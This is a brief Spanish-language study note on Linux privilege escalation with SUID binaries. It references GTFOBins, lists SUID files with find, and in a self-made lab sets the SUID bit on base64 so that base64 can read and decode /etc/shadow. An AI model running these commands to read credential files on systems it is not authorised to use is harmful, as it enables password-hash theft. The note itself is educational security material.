
> Se utiliza mucho [[GTFOBins]]

### Buscar binarios SUID
```bash
find / -perm -4000 -type f 2>/dev/null
```



para esclarar privilegios mediante esta tecnica puede verse por ejemplo lo siguiente

a modo de prueba se le da a base64 permisos 

primero si quieres ver que permisos tiene el binario
```bash
which base64 | xargs ls -l
```

para darle los permisos
```sh
chmod u+s $(which base64)
```


recordar que [[SUID y SGID]] permite a los usuarios ejecutar archivos con los permisos del propietario o grupo del archivo, en lugar de con los permisos del usuario que lo ejecuta.

si como usuario no privilegiado intento catear el etc shadows no me va a dejar. pero como tenemos el SUID puesto en base64 podemos hacer lo siguiente

```bash
base64 /etc/shadow
```

[[base64]] va a ejecutar como root y luego podemos agregar el decodificador para ver el contenido

```bash
base64 /etc/shadow | base64 -d
```

